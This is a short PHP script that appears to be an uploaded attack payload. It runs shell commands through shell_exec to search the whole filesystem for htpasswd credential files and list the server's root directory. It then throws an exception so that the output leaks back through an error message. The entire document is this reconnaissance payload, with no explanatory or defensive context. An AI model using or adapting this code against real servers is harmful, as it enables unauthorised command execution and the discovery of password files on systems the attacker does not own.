<?php
$output ='';

$output =$output."\n htpaswd ".shell_exec ('find / -name "*htpasswd" | cat');
$output =$output."\n root ls ".shell_exec ('ls / | cat');

throw new Exception("\n SUCCESS  ". $output."\n");
?>
